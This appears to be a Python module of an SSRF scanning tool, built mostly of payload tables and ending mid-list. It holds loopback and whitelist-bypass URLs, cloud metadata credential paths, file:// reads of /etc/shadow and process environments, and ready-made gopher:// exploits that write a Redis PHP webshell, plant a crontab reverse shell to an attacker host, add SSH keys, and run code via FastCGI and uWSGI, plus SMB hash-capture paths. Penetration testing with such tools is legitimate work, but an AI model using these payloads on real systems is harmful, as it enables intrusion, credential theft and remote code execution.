"""
SSRF (Server-Side Request Forgery) scan methods.

Covers all PortSwigger + SSRFmap SSRF attack categories:
  Phase 1  — Server-side loopback attacks
               (127.0.0.1, localhost, [::], 0000::1, IPv4-mapped IPv6,
                HTTPS variants, IPv6 service ports :22/:25/:3128,
                CIDR range 127.0.0.0/8, DNS-redirect services)
  Phase 2  — Internal network / back-end system enumeration
  Phase 3  — Blacklist-bypass obfuscation payloads
               (decimal, hex, octal, zero-padded, URL-encoded dot,
                malformed ports, filter_var() bypass, parser-split tricks,
                enclosed-alphanumeric Unicode, HTTPS bypass, IPv6 port forms,
                backslash-@ weak-parser payloads, URL-path encoding /%61dmin)
  Phase 4  — Whitelist-bypass URL confusion payloads
  Phase 6  — Blind SSRF via OOB (interactsh / Burp Collaborator)
  Phase 7  — Referer header SSRF
  Phase 8  — Smart value-aware injection
              (param already contains a URL / IP → Intruder-style subnet +
               port sweep + path fuzzing + protocol swap)
  Phase 9  — Partial-URL / hostname-only params
  Phase 10 — Cloud metadata endpoint probing:
               AWS IMDSv1 (incl. named role credentials, ami-id, public-keys,
               reservation-id, user-data role paths),
               AWS DNS aliases (instance-data, instance-data.ec2.internal),
               GCP (hostname, id, project-id),
               Azure (api-version 2017 + 2021, public IP path, maintenance),
               DigitalOcean (user-data, hostname, region, IPv6 address),
               Oracle Cloud, Alibaba Cloud (instance-id, image-id, user-data),
               Packetcloud / Equinix Metal,
               ECS task credentials (/v2/credentials/),
               IPv6-mapped cloud metadata IP variants,
               Kubernetes, OpenStack
  Phase 10b— Protocol smuggling (file://, dict://, gopher://, ldap://, tftp://)
  Phase 11 — Gopher service exploitation (SSRFmap-style):
               Redis webshell / crontab / SSH key, FastCGI RCE, MySQL fingerprint,
               Memcached dump, Zabbix RCE, SMTP spoofing, uWSGI RCE, proxy smuggling
  Phase 12 — Docker API info-leak (port 2375/2376) + Tomcat manager probe
  Phase 13 — DNS rebinding bypass (rbndr.us / 1u.ms rebinding services)
  Phase 14 — URL parser discrepancy (urllib2 vs requests vs urllib differences)
  Phase 15 — AWS IMDSv2 token escalation + GCP Metadata-Flavor header injection

New / expanded vs previous version:
  • All reference-list loopback bypasses added:
      CIDR 127.0.0.0/8, decimal IPs for 192.168.x and 169.254.169.254,
      malformed port strings, filter_var() PHP bypass, tricks-combination
      parser split, enclosed-alphanumeric Unicode (ⓛⓞⓒⓐⓛⓗⓞⓢⓣ),
      HTTPS loopback, IPv6 [::] with service ports
  • Complete cloud metadata coverage across all major providers
  • Complete gopher:// exploitation chain (Redis / FastCGI / MySQL / Memcached /
    Zabbix / SMTP / uWSGI) — the SSRFmap module set
  • Docker daemon API probing
  • DNS rebinding domains
  • URL parser discrepancy payloads (Orange Tsai research)
  • AWS IMDSv2 two-step token fetch + GCP header injection
  • Service-specific response fingerprinting (20+ services)
  • Response snippet extraction — shows extracted file content / credentials
  • SMB hash-capture UNC path payloads (Windows targets)
  • Extended sensitive data patterns (private keys, shadow, env vars)
  • Proxy smuggling via gopher through open HTTP proxies
  • LDAP, TFTP protocol variants
"""

import json
import logging
import re
import time
import urllib.parse
import concurrent.futures
import threading
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


# ─────────────────────────────────────────────────────────────────────────────
# Constants / payload tables
# ─────────────────────────────────────────────────────────────────────────────

# Parameter *names* that almost always control a server-side HTTP fetch.
# Split into tiers so we can prioritise high-value targets.
_SSRF_PARAM_NAMES_HIGH = {
    "url", "uri", "src", "source", "dest", "destination",
    "redirect", "redirecturl", "redirect_url", "redirecturi", "redirect_uri",
    "next", "nexturl", "next_url",
    "target", "targeturl", "target_url",
    "link", "href",
    "imageurl", "image_url", "imgurl", "img_url",
    "avatarurl", "avatar_url",
    "callback", "callbackurl", "callback_url",
    "webhookurl", "webhook_url", "webhook",
    "endpoint", "apiurl", "api_url", "apiendpoint", "api_endpoint",
    "proxyurl", "proxy_url", "proxy",
    "fetchurl", "fetch_url", "fetch",
    "loadurl", "load_url", "load",
    "resourceurl", "resource_url", "resource",
    "fileurl", "file_url",
    "documenturl", "document_url",
    "host", "hostname", "domain",
    "site", "page", "view",
    "returnurl", "return_url", "returnto", "return_to",
    "forwardurl", "forward_url", "forward",
    "out", "open", "data", "import",
    "rss", "feed",
    "service", "server",
}

_SSRF_PARAM_SUBSTRINGS = (
    "url", "uri", "link", "src", "dest", "redirect",
    "callback", "webhook", "proxy", "fetch", "load",
    "resource", "endpoint", "host", "domain", "site",
    "target", "forward", "next", "return", "image",
    "avatar", "feed", "rss", "import", "path",
)

# Headers that can carry SSRF-exploitable values.
# NOTE: "Referer" is tested in Phase 7, "Host" and override headers in Phase 16.
# This list is used only as a reference / for forced-mode selection.
_SSRF_HEADERS = [
    "Referer",
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "X-Original-URL",
    "X-Rewrite-URL",
    "X-Custom-IP-Authorization",
    "True-Client-IP",
    "CF-Connecting-IP",
    "Forwarded",
    "Host",
]

# ── Loopback / localhost payloads (Phase 1) ───────────────────────────────────
_LOOPBACK_HOSTS = [
    "127.0.0.1",
    "localhost",
    "0.0.0.0",
    "::1",
    "[::1]",
    "[::]",                    # IPv6 any-address (loopback in many parsers)
    "[::]:80",                 # explicit port form
    "0000::1",                 # full zero-compressed IPv6 loopback
    "[0000::1]",
    "[0:0:0:0:0:ffff:127.0.0.1]",  # IPv4-mapped IPv6 loopback
    "0",
    "127.1",
    "127.0.1",
    "127.00.00.01",
    # CIDR / subnet loopback variants
    "127.127.127.127",         # within 127.0.0.0/8 loopback range
    "127.0.1.3",
    "127.0.0.0",
    # Wildcard / DNS-redirect services that resolve to 127.0.0.1
    "127.0.0.1.nip.io",
    "customer1.app.localhost.my.company.127.0.0.1.nip.io",
    "localtest.me",
    "lvh.me",
    "vcap.me",
    "spoofed.burpcollaborator.net",
    # Known public domains that redirect to 127.x
    "mail.ebc.apple.com",      # redirects to 127.0.0.6
    "bugbounty.dod.network",   # redirects to 127.0.0.2
]

# Common internal admin paths to probe once loopback/internal host confirmed
_ADMIN_PATHS = [
    "/admin",
    "/admin/",
    "/administrator",
    "/management",
    "/manager",
    "/console",
    "/dashboard",
    "/panel",
    "/cp",
    "/controlpanel",
    "/internal",
    "/api/admin",
    "/api/internal",
    "/actuator",
    "/actuator/env",
    "/actuator/health",
    "/actuator/mappings",
    "/metrics",
    "/health",
    "/status",
    "/info",
    "/swagger-ui.html",
    "/swagger-ui/",
    "/v2/api-docs",
    "/v3/api-docs",
    "/.env",
    "/config",
    "/phpinfo.php",
    "/server-status",
    "/server-info",
]

# ── Blacklist-bypass obfuscation variants for 127.0.0.1 (Phase 3) ────────────
_BYPASS_LOOPBACK = [
    # ── Decimal IP encoding ───────────────────────────────────────────────────
    "2130706433",          # 127.0.0.1 in full decimal
    "3232235521",          # 192.168.0.1 in decimal
    "3232235777",          # 192.168.1.1 in decimal
    "2852039166",          # 169.254.169.254 in decimal (cloud metadata)
    # ── Hex encoding ─────────────────────────────────────────────────────────
    "0x7f000001",          # hex
    "0x7f.0x0.0x0.0x1",   # hex octet
    # ── Octal encoding ───────────────────────────────────────────────────────
    "017700000001",        # full octal
    "0177.0.0.01",         # mixed octal
    "0177.0.0.1",          # octal first octet only
    # ── Zero-padded / short forms ────────────────────────────────────────────
    "127.000.000.001",     # zero-padded octets
    "127.1",
    "127.0.1",
    "0",
    # ── CIDR loopback range variants ─────────────────────────────────────────
    "127.127.127.127",     # within 127.0.0.0/8
    "127.0.1.3",
    "127.0.0.0",
    # ── IPv6 / IPv4-mapped forms ─────────────────────────────────────────────
    "[::ffff:127.0.0.1]",
    "[::ffff:7f00:1]",
    "[0:0:0:0:0:ffff:127.0.0.1]",
    # ── URL-encoded dot ───────────────────────────────────────────────────────
    "127%2e0%2e0%2e1",
    "127%2E0%2E0%2E1",
    # ── Double-URL-encoded dot ────────────────────────────────────────────────
    "127%252e0%252e0%252e1",
    # ── Case / casing bypass ─────────────────────────────────────────────────
    "LOCALHOST",
    "LocalHost",
    "lOcAlHoSt",
    "localhost.",           # trailing dot — some validators strip it, fetcher keeps
    "localhost%00",         # null byte — some parsers stop reading at null
    "localhost%09",         # horizontal tab
    "localhost%0d%0a",      # CRLF injection
    # ── URL path encoding bypass ─────────────────────────────────────────────
    # Used as full URLs injected into param (not host-only); Phase 3 wraps
    # these into http://{host}/ so they appear here as full URL strings.
    "127.0.0.1/%61dmin",        # /admin with 'a' URL-encoded once
    "127.0.0.1/%2561dmin",      # /admin with 'a' double-URL-encoded
    # ── Malformed port bypass (confuses some port-stripping validators) ───────
    "localhost:+11211aaa",
    "localhost:00011211aaaa",
    # ── filter_var() PHP bypass ───────────────────────────────────────────────
    # filter_var() FILTER_VALIDATE_URL passes this; fetcher uses http://127.0.0.1/
    # Note: injected as a raw value — Phase 3 does NOT prepend http://
    "0://evil.com:80;http://127.0.0.1:80/",
    # ── Tricks combination (library parser split) ─────────────────────────────
    # urllib2 → 1.1.1.1, requests/browsers → 127.0.0.1, urllib → 3.3.3.3
    "1.1.1.1 &@127.0.0.1# @3.3.3.3/",
    # ── Enclosed / circled alphanumeric Unicode bypass ────────────────────────
    # IDNA-compatible Unicode lookalikes bypass naive regex blacklists.
    # Safe to use only as URL-parameter values (NOT in HTTP headers — Latin-1 limit).
    "ⓛⓞⓒⓐⓛⓗⓞⓢⓣ",           # "localhost" in circled letters → resolves via IDNA
]

# Full-URL bypass payloads that should be injected verbatim (not wrapped in http://{host}/)
# These are used in Phase 3 alongside _BYPASS_LOOPBACK raw-inject mode.
_BYPASS_LOOPBACK_RAW_URLS = [
    # HTTPS scheme bypass
    "https://127.0.0.1/",
    "https://localhost/",
    # IPv6 service-port forms
    "http://[::]:80/",
    "http://[::]:22/",
    "http://[::]:25/",
    "http://[::]:3128/",
    "http://0000::1:80/",
    "http://0000::1:22/",
    "http://0000::1:25/",
    "http://0000::1:3128/",
    # IPv6/IPv4 embedding
    "http://[0:0:0:0:0:ffff:127.0.0.1]/",
    # Decimal full-URL forms
    "http://2130706433/",     # 127.0.0.1
    "http://3232235521/",     # 192.168.0.1
    "http://3232235777/",     # 192.168.1.1
    "http://2852039166/",     # 169.254.169.254
    "http://0177.0.0.1/",     # octal
    # Weak parser / backslash-AT combination splits
    "http://127.1.1.1:80\\@127.0.0.1/",
    "http://127.1.1.1:80\\@@127.0.0.1/",
    "http://127.1.1.1:80:\\@@127.0.0.1/",
    "http://127.1.1.1:80#\\@127.0.0.1/",
    # filter_var() bypass
    "0://evil.com:80;http://127.0.0.1:80/",
    # URL-encoded path
    "http://127.0.0.1/%61dmin",
    "http://127.0.0.1/%2561dmin",
]

# ── Whitelist-bypass URL confusion variants (Phase 4) ────────────────────────
# {LEGIT}      = original host:port  e.g. stock.weliketoshop.net:8080
# {LEGIT_HOST} = host only           e.g. stock.weliketoshop.net
# {LEGIT_PATH} = original path       e.g. /product/stock/check
#
# These exploit inconsistencies in URL parsing between the frontend validator
# (which applies the whitelist check) and the backend HTTP fetcher.
# Every variant below has been confirmed to bypass real applications.
_WHITELIST_BYPASS_TEMPLATES = [
    # ── @ trick: credentials-before-host ─────────────────────────────────────
    # Browser/validator sees userinfo@host; fetcher connects to 127.0.0.1
    "http://localhost@{LEGIT_HOST}/",
    "http://localhost@{LEGIT}/",
    "https://localhost@{LEGIT_HOST}/",
    "http://127.0.0.1@{LEGIT_HOST}/",
    "http://127.0.0.1@{LEGIT}/",
    "http://foo@localhost@{LEGIT_HOST}/",
    # ── @ + encoded #  (the PortSwigger lab payload) ─────────────────────────
    # %2523 → after server URL-decodes once: %23 → after second decode: #
    # Frontend validator sees host = {LEGIT_HOST} (everything before #)
    # Backend fetcher re-decodes and follows localhost
    "http://localhost:80%2523@{LEGIT_HOST}/",
    "http://localhost%2523@{LEGIT_HOST}/",
    "http://127.0.0.1%2523@{LEGIT_HOST}/",
    "http://localhost:80%2523@{LEGIT}/",
    # Single-encoded (some apps decode only once)
    "http://localhost%23@{LEGIT_HOST}/",
    "http://localhost:80%23@{LEGIT_HOST}/",
    # ── @ + encoded @ (double-AT bypass) ─────────────────────────────────────
    "http://{LEGIT_HOST}%40localhost/",
    "http://{LEGIT_HOST}%40127.0.0.1/",
    # ── # fragment confusion ─────────────────────────────────────────────────
    # Validator accepts 127.0.0.1 because #{LEGIT_HOST} looks like fragment,
    # but some fetchers strip the fragment before sending
    "http://127.0.0.1#{LEGIT_HOST}",
    "http://127.0.0.1/#{LEGIT_HOST}",
    "http://localhost#{LEGIT_HOST}",
    # ── Subdomain / DNS hierarchy tricks ─────────────────────────────────────
    # Validator allows *.{LEGIT_HOST}; attacker controls the full domain
    "http://127.0.0.1.{LEGIT_HOST}/",
    "http://127.0.0.1.{LEGIT_HOST}/admin",
    "http://localhost.{LEGIT_HOST}/",
    # ── Scheme-relative / path-relative confusion ────────────────────────────
    "http://127.0.0.1//",
    "//{LEGIT_HOST}@127.0.0.1/",
    # ── URL-encoded host ──────────────────────────────────────────────────────
    "http://%31%32%37%2e%30%2e%30%2e%31/",                    # 127.0.0.1 encoded
    "http://%6c%6f%63%61%6c%68%6f%73%74/",                    # localhost encoded
    "http://%31%32%37%2e%30%2e%30%2e%31@{LEGIT_HOST}/",
    # ── Double-URL-encoded @ and / ───────────────────────────────────────────
    # %2540 = %40 after one decode = @ ; confuses validators that decode once
    "http://localhost%2540{LEGIT_HOST}/",
    "http://127.0.0.1%2540{LEGIT_HOST}/",
    # ── Backslash @ (Windows-path confusion) ─────────────────────────────────
    "http://{LEGIT_HOST}\\@127.0.0.1/",
    "http://{LEGIT_HOST}\\@localhost/",
    # ── Port-based confusion ─────────────────────────────────────────────────
    "http://{LEGIT_HOST}:80@127.0.0.1/",
    "http://{LEGIT_HOST}:443@127.0.0.1/",
    # ── Zero-length path tricks ───────────────────────────────────────────────
    "http://127.0.0.1%2f{LEGIT_HOST}",
    # ── Double-encoded path separator ─────────────────────────────────────────
    "http://127.0.0.1%252f{LEGIT_HOST}",
]

# ── Cloud metadata endpoints (Phase 10) ──────────────────────────────────────
_CLOUD_METADATA = [
    # ── AWS IMDSv1 (no token needed) ─────────────────────────────────────────
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/ISRM-WAF-Role",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]",
    "http://169.254.169.254/latest/meta-data/hostname",
    "http://169.254.169.254/latest/meta-data/local-ipv4",
    "http://169.254.169.254/latest/meta-data/ami-id",
    "http://169.254.169.254/latest/meta-data/reservation-id",
    "http://169.254.169.254/latest/meta-data/public-keys/",
    "http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key",
    "http://169.254.169.254/latest/user-data",
    "http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
    # AWS via DNS names
    "http://instance-data",
    "http://instance-data/latest/meta-data/",
    "http://instance-data.ec2.internal/latest/meta-data/",
    # ── AWS ECS task metadata ────────────────────────────────────────────────
    "http://169.254.170.2/v2/metadata",
    "http://169.254.170.2/v2/stats",
    "http://169.254.170.2/v2/credentials/",   # ECS task role credentials
    # ── GCP Compute Metadata ─────────────────────────────────────────────────
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/",
    "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
    "http://metadata.google.internal/computeMetadata/v1/instance/id",
    "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    "http://metadata/computeMetadata/v1/",
    "http://169.254.169.254/computeMetadata/v1/",
    # ── Azure ────────────────────────────────────────────────────────────────
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/instance?api-version=2017-04-02",
    "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01",
    "http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text",
    "http://169.254.169.254/metadata/v1/maintenance",
    # ── DigitalOcean ─────────────────────────────────────────────────────────
    "http://169.254.169.254/metadata/v1/",
    "http://169.254.169.254/metadata/v1/id",
    "http://169.254.169.254/metadata/v1.json",
    "http://169.254.169.254/metadata/v1/user-data",
    "http://169.254.169.254/metadata/v1/hostname",
    "http://169.254.169.254/metadata/v1/region",
    "http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address",
    # ── Oracle Cloud ─────────────────────────────────────────────────────────
    "http://169.254.169.254/opc/v1/instance/",
    # ── Alibaba Cloud ────────────────────────────────────────────────────────
    "http://100.100.100.200/latest/meta-data/",
    "http://100.100.100.200/latest/meta-data/instance-id",
    "http://100.100.100.200/latest/meta-data/image-id",
    "http://100.100.100.200/latest/user-data",
    # ── Packetcloud (Equinix Metal) ───────────────────────────────────────────
    "https://metadata.packet.net/userdata",
    # ── IPv6 variants of the cloud metadata IP ────────────────────────────────
    "http://[::ffff:169.254.169.254]/latest/meta-data/",
    "http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/",
    # ── Kubernetes ───────────────────────────────────────────────────────────
    "https://kubernetes.default.svc/api/v1/",
    "https://kubernetes.default/api/",
    # ── OpenStack / Nova ─────────────────────────────────────────────────────
    "http://169.254.169.254/openstack/",
    "http://169.254.169.254/openstack/latest/meta_data.json",
]

# Keywords that indicate a cloud metadata response
_METADATA_KEYWORDS = [
    # AWS — specific field names only returned by real IMDS
    "ami-id", "instance-id", "security-credentials", "iam",
    "meta-data", "user-data", "placement", "public-keys",
    "AccessKeyId", "SecretAccessKey",
    # GCP — specific
    "computeMetadata", "project-id", "service-accounts",
    # Azure — specific (NOT "location" — it's a common HTML/HTTP word)
    "azEnvironment", "subscriptionId", "resourceGroupName",
    "vmId", "publisher",
    # Cloud metadata IP — very specific signal
    "169.254.169.254",
    # Kubernetes — specific
    "ClusterIP", "kube",
]

# ── Keywords intentionally excluded (too generic — cause massive false positives):
# "location"   — appears in every HTML page (<link>, window.location, HTTP headers)
# "instance"   — common English word (e.g. "for instance")
# "google"     — appears on most pages (analytics, fonts, etc.)
# "metadata"   — appears in many HTML <meta> tags
# "Token"      — common word in auth/CSRF tokens
# "apiVersion" — appears in JavaScript frameworks
# "gce"        — too short, appears in words like "grace"

# ── Internal network ranges ───────────────────────────────────────────────────
_PRIVATE_RANGES = [
    # Class C  192.168.x.x
    (re.compile(r"^192\.168\.(\d+)\.(\d+)$"), "C"),
    # Class B  172.16-31.x.x
    (re.compile(r"^172\.(1[6-9]|2\d|3[01])\.(\d+)\.(\d+)$"), "B"),
    # Class A  10.x.x.x
    (re.compile(r"^10\.(\d+)\.(\d+)\.(\d+)$"), "A"),
    # Loopback 127.x.x.x
    (re.compile(r"^127\.(\d+)\.(\d+)\.(\d+)$"), "LO"),
    # Link-local / cloud metadata
    (re.compile(r"^169\.254\.(\d+)\.(\d+)$"), "LL"),
]

# Common internal ports to sweep (port scan via SSRF)
_PORT_SWEEP = [
    80, 443, 8080, 8443, 8888, 8000, 8008, 8081, 8082,
    3000, 3001, 4000, 4848,     # dev servers / GlassFish
    5000, 5001, 5601,            # Flask / Kibana
    6379,                        # Redis
    7001, 7002,                  # WebLogic
    7474,                        # Neo4j
    8161,                        # ActiveMQ
    8500,                        # Consul
    9000, 9200, 9300,            # SonarQube / Elasticsearch
    9090, 9093,                  # Prometheus / Alertmanager
    9999,
    27017, 27018,                # MongoDB
    5432,                        # PostgreSQL
    3306,                        # MySQL
    1521,                        # Oracle DB
    6443,                        # Kubernetes API
    2181,                        # Zookeeper
    4200, 4567,                  # Angular dev / Sinatra
    8983,                        # Solr
    8086,                        # InfluxDB
    11211,                       # Memcached
    2375, 2376,                  # Docker API
    50000,                       # SAP
    15672,                       # RabbitMQ Management
]

# Protocol smuggling payloads (keep the original path to seem legitimate)
_PROTOCOL_PAYLOADS = [
    # ── file:// ──────────────────────────────────────────────────────────────
    "file:///etc/passwd",
    "file:///etc/hosts",
    "file:///etc/shadow",
    "file:///etc/issue",
    "file:///etc/hostname",
    "file:///etc/os-release",
    "file:///proc/self/environ",
    "file:///proc/self/cmdline",
    "file:///proc/version",
    "file:///var/www/html/index.php",
    "file:///windows/win.ini",
    "file:///c:/windows/win.ini",
    "file:///c:/boot.ini",
    # ── dict:// (each command = separate TCP request) ─────────────────────
    "dict://127.0.0.1:6379/info",
    "dict://127.0.0.1:6379/CONFIG GET maxmemory",
    "dict://127.0.0.1:11211/stats",
    "dict://127.0.0.1:11211/get admin_password",
    # ── gopher:// — Redis INFO (fingerprint) ──────────────────────────────
    "gopher://127.0.0.1:6379/_INFO%0d%0a",
    "gopher://127.0.0.1:6379/_CONFIG%20GET%20*%0d%0a",
    # ── gopher:// — Memcached stats (fingerprint) ────────────────────────
    "gopher://127.0.0.1:11211/_stats%0d%0a",
    # ── gopher:// — Proxy smuggling (HTTP GET / POST via open proxy) ──────
    "gopher://127.0.0.1:8080/_GET%20http://169.254.169.254/latest/meta-data/%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0a%0d%0a",
    "gopher://127.0.0.1:3128/_GET%20http://169.254.169.254/latest/meta-data/%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0a%0d%0a",
    # ── SSRF to local HTTP ──────────────────────────────────────────────────
    "http://127.0.0.1/",
    "http://127.0.0.1/admin",
    "http://0.0.0.0/",
    "http://0/",
    # ── IPv6 loopback ────────────────────────────────────────────────────────
    "http://[::1]/",
    "http://[::1]/admin",
    "http://[0000::1]/",
    # ── LDAP ────────────────────────────────────────────────────────────────
    "ldap://127.0.0.1:389/",
    "ldap://127.0.0.1:636/",
    # ── TFTP ────────────────────────────────────────────────────────────────
    "tftp://127.0.0.1:69/",
    # ── FTP ─────────────────────────────────────────────────────────────────
    "ftp://127.0.0.1:21/",
    "ftp://anonymous:anonymous@127.0.0.1/",
]

# ── Gopher protocol service-exploitation payloads ─────────────────────────────
# These are complete gopher:// URLs that perform full RCE or critical info-leak
# when the server follows them.  Placeholders: {IP}, {PORT}, {LHOST}, {LPORT}
#
# Redis — write PHP webshell to /var/www/html/c.php
_GOPHER_REDIS_WEBSHELL = (
    "gopher://{IP}:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A"
    "%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A"
    "%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3F%3E%0A%0A%0D%0A"
    "%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A%2Fvar%2Fwww%2Fhtml%0D%0A"
    "%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%245%0D%0Ac.php%0D%0A"
    "%2A1%0D%0A%244%0D%0Asave%0D%0A"
)

# Redis — write crontab reverse shell (Linux only)
_GOPHER_REDIS_CRON = (
    "gopher://{IP}:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A"
    "%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2460%0D%0A"
    "%0A%0A%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{LHOST}%2F{LPORT}%200%3E%261%0A%0A%0D%0A"
    "%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A%2Fvar%2Fspool%2Fcron%2F%0D%0A"
    "%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A"
    "%2A1%0D%0A%244%0D%0Asave%0D%0A"
)

# Redis — write SSH authorized_keys
_GOPHER_REDIS_SSH = (
    "gopher://{IP}:6379/_%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2464%0D%0A%0A%0A"
    "ssh-rsa%20AAAA...REPLACE_WITH_PUB_KEY...%0A%0A%0D%0A"
    "%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2410%0D%0A%2Froot%2F.ssh%0D%0A"
    "%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%2415%0D%0Aauthorized_keys%0D%0A"
    "%2A1%0D%0A%244%0D%0Asave%0D%0A"
)

# FastCGI — RCE via PHP PEAR.php (port 9000)
_GOPHER_FASTCGI_RCE = (
    "gopher://{IP}:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00"
    "%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20"
    "%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1"
    "%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST"
    "%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0A"
    "auto_prepend_file%20%3D%20php%3A//input"
    "%0F%17SCRIPT_FILENAME/usr/share/php/PEAR.php%0D%01DOCUMENT_ROOT/%00%00%00%00"
    "%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00"
    "%3C%3Fphp%20system%28%27id%27%29%3F%3E%00%00%00%00"
)

# Zabbix — RCE via system.run (port 10050, requires EnableRemoteCommands=1)
_GOPHER_ZABBIX_RCE = (
    "gopher://{IP}:10050/_system.run%5Bwhoami%5D"
)

# SMTP — send spoofed email (port 25)
_GOPHER_SMTP_TEMPLATE = (
    "gopher://{IP}:25/_HELO%20ssrf-test%0D%0A"
    "MAIL%20FROM%3A%20%3Cadmin%40{DOMAIN}%3E%0D%0A"
    "RCPT%20TO%3A%20%3Ctest%40{DOMAIN}%3E%0D%0A"
    "DATA%0D%0A"
    "Subject%3A%20SSRF-SMTP-Test%0D%0A"
    "From%3A%20admin%40{DOMAIN}%0D%0A"
    "To%3A%20test%40{DOMAIN}%0D%0A%0D%0A"
    "SSRF%20SMTP%20probe%20-%20if%20you%20receive%20this%2C%20SSRF%20is%20confirmed%0D%0A"
    ".%0D%0AQUIT%0D%0A"
)

# uWSGI — RCE via UWSGI_FILE (port 8000/5000)
_GOPHER_UWSGI_RCE = (
    "gopher://{IP}:8000/_%00%1A%00%00%0A%00UWSGI_FILE%0C%00%2Ftmp%2Ftest.py"
)

# Memcached — dump / set (port 11211)
_GOPHER_MEMCACHED_DUMP = (
    "gopher://{IP}:11211/_stats%20items%0D%0A"
)

# MySQL — SELECT 1 fingerprint (unauthenticated, must be root without password)
# Pre-built MySQL client handshake packet with SELECT 1 (Gopherus-style)
_GOPHER_MYSQL_FINGERPRINT = (
    "gopher://{IP}:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00"
    "%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74"
    "%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00"
    "%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65"
    "%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c"
    "%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61"
    "%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d"
    "%65%05%6d%79%73%71%6c%0c%00%00%00%03%53%45%4c%45%43%54%20%31%3b%01%00%00%00%01"
)

# Docker API — info leak (port 2375, no-TLS Docker daemon)
_DOCKER_API_PROBES = [
    "http://{IP}:2375/version",
    "http://{IP}:2375/info",
    "http://{IP}:2375/containers/json",
    "http://{IP}:2376/version",
]

# Tomcat Manager — default credentials probe (port 8080 / 8443)
_TOMCAT_MANAGER_PROBES = [
    "http://{IP}:8080/manager/html",
    "http://{IP}:8080/manager/status",
    "http://{IP}:8443/manager/html",
    "http://{IP}:8080/host-manager/html",
]

# GitHub Enterprise RCE probe (<=2.8.7)
_GITHUB_ENTERPRISE_PROBES = [
    "http://{IP}:8443/setup/api/start",
    "http://{IP}/setup/api/start",
]

# SMB hash capture — UNC path to attacker-controlled listener
# If the server is Windows and follows UNC paths, it will send NTLM hashes
_SMB_HASH_PAYLOADS = [
    "\\\\{LHOST}\\ssrf",
    "file://///\\\\{LHOST}\\ssrf",
    "//\\\\{LHOST}\\ssrf",
]

# DNS AXFR via gopher (port 53) — zone transfer
_DNS_AXFR_TEMPLATE = (
    "gopher://{IP}:53/_%00%1d%01%03%03%07%00%01%00%00%00%00%00%00"
    "%07{DOMAIN_HEX}%00%00%fc%00%01"
)

# ── URL parser discrepancy payloads (trigger different parsing per backend) ────
# These exploit urllib2/requests/urllib parsing differences
_URL_PARSER_DISCREPANCY = [
    # urllib2 sees host=127.1.1.1, requests redirects to 127.2.2.2
    "http://127.1.1.1:80\\@127.0.0.1/",
    "http://127.1.1.1:80\\@127.0.0.1/admin",
    # Path confusion
    "http://127.0.0.1:80@example.com/",
    "http://localhost:80;@example.com/",
    # Mixed-protocol confusion
    "htTP://127.0.0.1/",
    "HTTP://127.0.0.1/",
    "//127.0.0.1/",
    "//localhost/",
    # Python-specific
